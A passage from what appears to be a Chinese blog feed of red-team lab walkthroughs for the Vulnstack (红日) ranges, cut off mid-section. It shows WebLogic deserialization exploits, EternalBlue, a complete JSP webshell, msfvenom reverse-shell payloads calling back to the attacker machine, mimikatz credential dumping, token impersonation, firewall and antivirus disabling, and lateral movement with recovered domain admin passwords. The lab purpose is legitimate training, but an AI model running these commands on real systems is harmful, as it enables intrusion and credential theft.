class="headerlink" title="minikatz"></a>minikatz</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#利用MSF的kiwi模块</span><br><span class="line">load kiwi</span><br><span class="line">#列出所有凭据</span><br><span class="line">creds_all</span><br><span class="line">#使用kiwi抓取明文密码：</span><br><span class="line">kiwi_cmd sekurlsa::logonpasswords</span><br><span class="line">#win7</span><br></pre></td></tr></table></figure><p>可以看出win7这台机器上，信息极少，无用</p><p>​<img src="/assets/win7%E5%8A%A0%E8%BD%BDkiwi-20231130160518-yzvvva7.png" alt="win7加载kiwi">​</p><p>试试win2k8这台机器</p><p>​<img src="/assets/win2k8--%E6%8A%93%E5%8F%96%E7%A5%A8%E6%8D%AE-20231130160603-u2o5y91.png" alt="win2k8--抓取票据">​</p><p>成功拿到域控账密</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">---&gt;拿到密码：zxcASDqw123!!</span><br></pre></td></tr></table></figure><h3 id="尝试psexec攻击域控"><a href="#尝试psexec攻击域控" class="headerlink" title="尝试psexec攻击域控"></a>尝试psexec攻击域控</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set SMBUser administrator</span><br><span class="line">set SMBPass zxcASDqw123!!</span><br><span class="line">set RHOSTS  192.168.93.10</span><br><span class="line">run</span><br><span class="line">#攻击失败，可能是防火墙的原因</span><br><span class="line">#换个姿势继续</span><br><span class="line">#其它两台主机已经拿下,在win2k8上窃取管理员用户的token令牌</span><br><span class="line">#这样就可以通过win2008 访问域控，然后远程关掉域控的防火墙,psexec攻击继续</span><br></pre></td></tr></table></figure><p>​<img src="/assets/psexec%E6%94%BB%E5%87%BB%E5%9F%9F%E6%8E%A7%E5%A4%B1%E8%B4%A5--%E9%98%B2%E7%81%AB%E5%A2%99-20231130160733-332um0t.png" alt="psexec攻击域控失败--防火墙">​</p><h3 id="窃取域控token令牌"><a href="#窃取域控token令牌" class="headerlink" title="窃取域控token令牌"></a>窃取域控token令牌</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#先利用MSF生成一个正向的木马</span><br><span class="line">msfvenom -p windows/meterpreter/bind_tcp LHOST=192.168.43.33 LPORT=10244 -f exe -o 244.exe</span><br><span class="line">#上传244.exe</span><br><span class="line">upload 244.exe</span><br><span class="line">#运行244.exe</span><br><span class="line">244.exe</span><br><span class="line">#返回msf的shell</span><br><span class="line">exit</span><br><span class="line">#窃取token</span><br><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token &quot;TEST\Adminitrator&quot;</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E7%AA%83%E5%8F%96token%E6%88%90%E5%8A%9F-20231130161531-ztx02vu.png" alt="窃取token成功">​</p><p>试试win7这台机器能否成功</p><p>​<img src="/assets/win7%E4%B8%8D%E8%83%BD%E7%AA%83%E5%8F%96token-20231130161620-48f1g4p.png" alt="win7不能窃取token">​</p><p>显然失败了，因为不存在</p><h3 id="关闭域控防火墙"><a href="#关闭域控防火墙" class="headerlink" title="关闭域控防火墙"></a>关闭域控防火墙</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.93.10 create unablefirewall binpath= &quot;netsh advfirewall set allprofiles state off&quot;</span><br><span class="line">sc \\192.168.93.10 start unablefirewall</span><br><span class="line">#响应超时，执行失败</span><br></pre></td></tr></table></figure><p>​<img src="/assets/Sc%E5%A4%B1%E8%B4%A5-20231130161712-89q19oa.png" alt="Sc失败">​</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#简直有毒</span><br><span class="line">#登上去一看，他喵的这不是关了吗？</span><br></pre></td></tr></table></figure><p>​![屏幕截图 2023-11-30 162317](assets&#x2F;屏幕截图 2023-11-30 162317-20231130162404-wghe5oq.png)​</p><h3 id="psexec继续攻击域控"><a href="#psexec继续攻击域控" class="headerlink" title="psexec继续攻击域控"></a>psexec继续攻击域控</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#显然失败了，可能是防火墙的原因（鬼知道什么原因）也可能是会话连接不稳定</span><br></pre></td></tr></table></figure><p>​<img src="/assets/psexec%E6%94%BB%E5%87%BB%E5%9F%9F%E6%8E%A7%E5%A4%B1%E8%B4%A5--%E9%98%B2%E7%81%AB%E5%A2%99-20231130160733-332um0t.png" alt="psexec攻击域控失败--防火墙">​</p><h3 id="利用wmiexec"><a href="#利用wmiexec" class="headerlink" title="利用wmiexec"></a>利用wmiexec</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#kali中安装wmiexec</span><br><span class="line">https://github.com/coresecurity/impacket/blob/masterexamples/wmiexec.py</span><br><span class="line">#需要先下载impacket工具包，这里面有很多工具</span><br><span class="line">git clone https://github.com/CoreSecurity/impacket.git</span><br><span class="line">cd impacket/</span><br><span class="line">pip install .</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd ./examples</span><br><span class="line">#安装成功后，切换到examples目录下，</span><br><span class="line">#运行如下命令获取目标系统192.168.93.10(域控)的shell</span><br><span class="line">proxychains python3 wmiexec.py &#x27;administrator:zxcASDqw123!!@192.168.93.10&#x27;</span><br><span class="line"></span><br><span class="line">#也可以拿到其它机器的shell</span><br><span class="line">proxychains python3 wmiexec.py &#x27;administrator:123qwe!ASD@192.168.93.20&#x27;</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7-20231130162741-bp97g4z.png" alt="拿下域控">​</p><p>192.168.93.20</p><p><img src="/assets/wmiexec%E6%8B%BF%E4%B8%8B20-20231130162744-ksoydg9.png" alt="wmiexec拿下20">​​</p><h3 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#最终在C:\Users\Adminisreator\Documents\目录下找到flag.txt</span><br><span class="line">dir</span><br><span class="line">type flag.txt</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E6%8B%BF%E4%B8%8Bflag-20231130162830-docw3la.png" alt="拿下flag">​</p><h3 id="Sessions"><a href="#Sessions" class="headerlink" title="Sessions"></a>Sessions</h3><p>​<img src="/assets/sessions-20231130162905-zkjdypj.png" alt="sessions">​</p><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 红日靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 转载 </tag>
            
            <tag> 测试 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 红日靶场 </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ATK—CK红队评估实战靶场二</title>
      <link href="/2024/04/11/hrbc/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA02/"/>
      <url>/2024/04/11/hrbc/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA02/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="红日靶场02"><a href="#红日靶场02" class="headerlink" title="红日靶场02"></a>红日靶场02</h1><h2 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h2><ul><li>红日靶场：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/">http://vulnstack.qiyuanxuetang.net/vuln/detail/3/</a></li><li>靶机通用密码：1qaz@WSX</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">192.168.43.201 PC</span><br><span class="line">10.10.10.201   PC</span><br><span class="line">192.168.43.80  WEB</span><br><span class="line">10.10.10.80    WEB</span><br><span class="line">192.168.43.33  kali+CS+MSF</span><br><span class="line">cs客户端  本机win11</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1.为三台虚拟机添加网卡</span><br><span class="line">DC在该环境中充当是域控。</span><br><span class="line">三台虚拟机添加VMnet2网卡</span><br><span class="line"></span><br><span class="line">2.登录PC服务器，WEB服务器</span><br><span class="line">#web服务器ip地址修改为192.168.43.80</span><br><span class="line">#pc服务器ip地址修改为192.168.43.201</span><br><span class="line"></span><br><span class="line">3.启动weblogic</span><br><span class="line">我们在web中，打开</span><br><span class="line">C:\Oracle\Middleware\user_projects\domains\base_domain\bin 路径</span><br><span class="line">使用管理员才能进去administrator/1qaz@WSX</span><br><span class="line">以管理员权限执行setDomainENV、startManageWeblogic、startWeblogic  </span><br><span class="line">环境配置到此结束</span><br></pre></td></tr></table></figure><p>​<img src="/assets/PC%E6%9C%8D%E5%8A%A1%E5%99%A8-20231118181258-gy1d5dq.png" alt="PC服务器">​![WEB (2)](assets&#x2F;WEB 2-20231118181258-bowpele.png)​​</p><p>​<img src="/assets/WEB-20231118181258-5mnk31e.png" alt="WEB">​![屏幕截图 2023-11-13 130910](assets&#x2F;屏幕截图 2023-11-13 130910-20231118181921-kcvumba.png)​<img src="/assets/%E4%B8%89%E4%B8%AA%E8%84%9A%E6%9C%AC-20231118181555-xkrj1g6.png" alt="三个脚本">​​​​​</p><h2 id="二、外网渗透"><a href="#二、外网渗透" class="headerlink" title="二、外网渗透"></a>二、外网渗透</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.43.0/24</span><br><span class="line">nmap -A -sV -v -O -T4 -sS 192.168.43.80</span><br><span class="line"></span><br><span class="line">#发现开启了80，1433，3389，7001</span><br><span class="line">#web访问一波</span><br></pre></td></tr></table></figure><p>​<img src="/assets/3389+7001-20231118182922-tgstpwk.png" alt="3389+7001">​</p><p>​<img src="/assets/80+1433-20231118182922-lcl2ig0.png" alt="80+1433"></p><h3 id="WEB界面"><a href="#WEB界面" class="headerlink" title="WEB界面"></a>WEB界面</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#发现80端口为空白页面</span><br><span class="line">#7001端口报错，cms为Weblogic</span><br></pre></td></tr></table></figure><p>​<img src="/assets/80%E7%AB%AF%E5%8F%A3-20231118183058-85x10x8.png" alt="80端口">​<img src="/assets/7001%E7%AB%AF%E5%8F%A3-20231118183107-buai4q2.png" alt="7001端口">​​</p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.43.80</span><br><span class="line">#目录爆破也毫无结果</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4-20231118183220-o8pvmk8.png" alt="目录爆破">​</p><h3 id="WeblogicScan工具"><a href="#WeblogicScan工具" class="headerlink" title="WeblogicScan工具"></a>WeblogicScan工具</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">因为是weblogic的站，直接上工具</span><br><span class="line"></span><br><span class="line">kali安装：</span><br><span class="line">git clone https://github.com/rabbitmask/WeblogicScan</span><br><span class="line">启动：</span><br><span class="line">python3 ./WeblogicScan.py -u 192.168.43.80 -p 7001</span><br><span class="line">结果：</span><br><span class="line">存在几个CVE</span><br></pre></td></tr></table></figure><p>​<img src="/assets/weblogicScan%E7%BB%93%E6%9E%9C-20231118183403-hnar7qk.png" alt="weblogicScan结果">​</p><h3 id="CVE利用"><a href="#CVE利用" class="headerlink" title="CVE利用"></a>CVE利用</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#百度一波CVE-2019-2725 CVE-2019-2729</span><br><span class="line">#两个CVE均存在</span><br><span class="line">CVE-2019-2729-Exp工具：</span><br><span class="line">git clone https://github.com/ruthlezs/CVE-2019-2729-Exploit</span><br><span class="line">python oracle-weblogic-deserialize.py -u http://192.168.43.80:7001 -c whoami</span><br></pre></td></tr></table></figure><p>​<img src="/assets/CVE-2019-2725-20231118183532-zh7o3ek.png" alt="CVE-2019-2725">​<img src="/assets/CVE-2019-2729-20231118183535-kz4as70.png" alt="CVE-2019-2729">​​</p><p>​<img src="/assets/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C2729--whoami-20231118183627-s70jbas.png" alt="命令执行2729--whoami">​</p><h3 id="MSF利用CVE-2019-2725"><a href="#MSF利用CVE-2019-2725" class="headerlink" title="MSF利用CVE-2019-2725"></a>MSF利用CVE-2019-2725</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search cve-2019-2725</span><br><span class="line">use 0</span><br><span class="line">set payload</span><br><span class="line">set target 1   ----windows机器</span><br><span class="line">利用失败   #环境有问题，别的博主都成功了，我们换个思路</span><br></pre></td></tr></table></figure><p>​<img src="/assets/MSF+CVE-2725-20231118183757-scp265d.png" alt="MSF+CVE-2725">​</p><p>​<img src="/assets/2725%E5%A4%B1%E8%B4%A5-20231118183751-3pca5em.png" alt="2725失败"></p><h3 id="MSF利用永恒之蓝"><a href="#MSF利用永恒之蓝" class="headerlink" title="MSF利用永恒之蓝"></a>MSF利用永恒之蓝</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use windows/smb/ms17_010_eternablue</span><br><span class="line">set rhost 192.168.43.80</span><br><span class="line">set lhost 192.168.43.33</span><br><span class="line">run</span><br><span class="line">#发现被360拦截，换个思路继续</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E5%88%A9%E7%94%A8BLUE-20231118184507-25mh021.png" alt="利用BLUE">​</p><p>​<img src="/assets/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E8%A2%AB%E6%8B%A6%E6%88%AA-20231118184507-x0qs4ii.png" alt="永恒之蓝被拦截">​</p><h3 id="上传小马"><a href="#上传小马" class="headerlink" title="上传小马"></a>上传小马</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#利用工具上传小马</span><br><span class="line">java -jar Java反序列化漏洞利用工具V1.7.jar</span><br><span class="line">#获取当前路径</span><br><span class="line">echo %cd%</span><br><span class="line">C:\Oracle\Middleware\user_projects\domains\base_domain</span><br><span class="line">#上传jsp木马</span><br><span class="line">&lt;%!</span><br><span class="line">    class U extends ClassLoader &#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            super(c);</span><br><span class="line">        &#125;</span><br><span class="line">        public Class g(byte[] b) &#123;</span><br><span class="line">            return super.defineClass(b, 0, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public byte[] base64Decode(String str) throws Exception &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class="line">            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            Class clazz = Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">            Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);</span><br><span class="line">            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String cls = request.getParameter(&quot;passwd&quot;);</span><br><span class="line">    if (cls != null) &#123;</span><br><span class="line">        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">#密码为psswd</span><br></pre></td></tr></table></figure><p>​<img src="/assets/java%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7%E5%AD%98%E5%9C%A82725-20231118185322-2vh339c.png" alt="java利用工具存在2725"></p><h3 id="蚁剑连接木马"><a href="#蚁剑连接木马" class="headerlink" title="蚁剑连接木马"></a>蚁剑连接木马</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#打开蚁剑连接小马</span><br><span class="line">#蚁剑虚拟终端</span><br><span class="line">#发现我们已经是administrator用户</span><br><span class="line">#关闭win防火墙</span><br><span class="line">netsh advfirewall set allprofiles state off </span><br><span class="line">#查看防火墙配置状态</span><br><span class="line">netsh advfirewall show allprofile state </span><br><span class="line">#虽然是乱码，但我们仍可以看出防火墙已关闭</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5jsp%E6%9C%A8%E9%A9%AC-20231118185348-aq7ymjk.png" alt="蚁剑连接jsp木马"><br>​<img src="/assets/%E5%85%B3%E9%97%AD%E9%98%B2%E7%81%AB%E5%A2%99-20231118185508-h6vofxz.png" alt="关闭防火墙">![关闭防火墙 (2)](assets&#x2F;关闭防火墙 2-20231118185514-2s649am.png)![关闭防火墙 (3)](assets&#x2F;关闭防火墙 3-20231118185518-y6tqdo4.png)​</p><h3 id="蚁剑上传大马"><a href="#蚁剑上传大马" class="headerlink" title="蚁剑上传大马"></a>蚁剑上传大马</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#创建后门程序</span><br><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.43.33 LPORT=10888 -f exe -o 233.exe </span><br><span class="line">#开启监听，设置sessions</span><br><span class="line">use exp/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter_reverse_tcp </span><br><span class="line">set lhost 33</span><br><span class="line">set lport 10888</span><br><span class="line">run</span><br><span class="line">#蚁剑上传</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E8%9A%81%E5%89%91%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC-20231118185834-4d57as9.png" alt="蚁剑上传木马"></p><h3 id="MSF监听大马"><a href="#MSF监听大马" class="headerlink" title="MSF监听大马"></a>MSF监听大马</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run</span><br><span class="line">#发现我们只拿到了几十秒的shell，就被杀了</span><br><span class="line">#由于博主无计可施，再加上靶场环境总有些问题</span><br><span class="line">#博主尝试最后一种方法：进程迁移提权</span><br></pre></td></tr></table></figure><p>​<img src="/assets/MSF+233%E8%A2%AB%E6%9D%80%E4%BA%86-20231118190007-ti74ygu.png" alt="MSF+233被杀了">​<img src="/assets/360%E6%9D%80%E4%BA%86233Exe-20231118190012-7784vg2.png" alt="360杀了233Exe">​​</p><h3 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#进程迁移到system权限进程services</span><br><span class="line">#services.exe是微软windows操作系统的一部分。</span><br><span class="line">#用于管理启动和停止服务</span><br><span class="line">#查看进程</span><br><span class="line">ps</span><br><span class="line">---     496   392   services.exe</span><br><span class="line">---     x64   0     NT AUTHORITY\SYSTEM       </span><br><span class="line">---     C:\Windows\system32\services.exe</span><br><span class="line">#进行进程迁移</span><br><span class="line">migrate 496</span><br><span class="line">run killav   关闭杀软   ---没有用</span><br><span class="line">#查看360的进程</span><br><span class="line">taskkill /f /PID 272   ---没用</span><br><span class="line"></span><br><span class="line">#得到系统权限，并且用不失联</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E8%BF%9B%E7%A8%8B%E8%BF%81%E7%A7%BB1-20231118190322-r8k6hge.png" alt="进程迁移1">​</p><p>​<img src="/assets/%E8%BF%9B%E7%A8%8B%E6%8F%90%E6%9D%832-20231118190424-qwzsd46.png" alt="进程提权2">​</p><h2 id="三、内网渗透"><a href="#三、内网渗透" class="headerlink" title="三、内网渗透"></a>三、内网渗透</h2><h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#利用msf进行信息收集</span><br><span class="line">查看当前域,定位域控</span><br><span class="line">net time /domain</span><br><span class="line">查看当前主机网卡</span><br><span class="line">ipconfig /all</span><br><span class="line">查询域管理员</span><br><span class="line">net group &quot;domain admins&quot; /domain </span><br><span class="line">查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span><br><span class="line">net config Workstation </span><br><span class="line">打印路由信息，查看域网段</span><br><span class="line">route print</span><br><span class="line">查看域内账户</span><br><span class="line">net user /domain</span><br><span class="line">-------------------------------</span><br><span class="line">#利用MSF进行内网信息收集</span><br><span class="line">run post/windows/gather/enum_ad_computers</span><br><span class="line">查看域内成员</span><br><span class="line">run post/windows/gather/enum_domain </span><br><span class="line">查看域控</span><br><span class="line">run post/multi/manage/autoroute</span><br><span class="line">新建路由</span><br><span class="line">use post/windows/gather/arp_scanner</span><br><span class="line">探测内网存活主机</span><br><span class="line">------------------------------</span><br><span class="line">域名：delay.com</span><br><span class="line">域控：dc.de1ay.com [10.10.10.10]</span><br><span class="line">域内主机：DC.  WEB.</span><br><span class="line">域内账户：Administrator,de1ay,Guest,krbtgt,mssql</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E5%BE%97ping%E5%9F%9F%E6%8E%A7IP-20231118190822-1jepa1u.png" alt="得ping域控IP">​</p><p>​<img src="/assets/%E6%9F%A5%E7%9C%8B%E4%BA%8E%E5%86%85%E6%88%90%E5%91%98-20231118190822-6269rga.png" alt="查看于内成员">​</p><p>​<img src="/assets/%E6%9F%A5%E7%9C%8B%E5%9F%9F%E5%86%85%E8%B4%A6%E6%88%B7-20231118190822-qyd0g2c.png" alt="查看域内账户">​</p><p>​<img src="/assets/%E6%9F%A5%E7%9C%8B%E5%9F%9F%E6%8E%A7-20231118190822-lopuc7k.png" alt="查看域控">​</p><p>​<img src="/assets/%E8%B7%AF%E7%94%B1%E4%BF%A1%E6%81%AF-20231118190822-olg2kfn.png" alt="路由信息">​</p><h3 id="MSF-Kiwi模块"><a href="#MSF-Kiwi模块" class="headerlink" title="MSF-Kiwi模块"></a>MSF-Kiwi模块</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#加载kiwi</span><br><span class="line">load kiwi</span><br><span class="line">#列出所有凭据</span><br><span class="line">creds_all</span><br><span class="line">#使用kiwi抓取明文密码：</span><br><span class="line">kiwi_cmd sekurlsa::logonpasswords</span><br><span class="line">#解析NTML值：161cff084477fe596a5db81874498a24</span><br><span class="line">#发现密码为1qaz@WSX</span><br><span class="line">#得到administrator,mssql,</span><br></pre></td></tr></table></figure><p>​<img src="/assets/kiwi%E6%A8%A1%E5%9D%97-20231118191100-uk7pxbt.png" alt="kiwi模块">​</p><p>​<img src="/assets/CMD5-20231118191116-z1tmv84.png" alt="CMD5">​</p><p>​<img src="/assets/kiwi%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-20231118191116-twmqw0a.png" alt="kiwi命令执行">​</p><h3 id="Hasdump"><a href="#Hasdump" class="headerlink" title="Hasdump"></a>Hasdump</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br><span class="line">#解密为空</span><br><span class="line">---#因为当系统为win10或2012R2以上时，</span><br><span class="line">---#默认在内存缓存中禁止保存明文密码，密码字段显示为null，</span><br><span class="line">---#需要修改注册表等用户重新登录后才能成功抓取。</span><br></pre></td></tr></table></figure><p>​<img src="/assets/hashdump-20231118191242-2w2bz8a.png" alt="hashdump">​</p><p>​<img src="/assets/hashdump%E4%B8%BA%E7%A9%BA-20231118191242-jrxatqd.png" alt="hashdump为空">​</p><h2 id="四、横向渗透"><a href="#四、横向渗透" class="headerlink" title="四、横向渗透"></a>四、横向渗透</h2><h3 id="添加代理"><a href="#添加代理" class="headerlink" title="添加代理"></a>添加代理</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 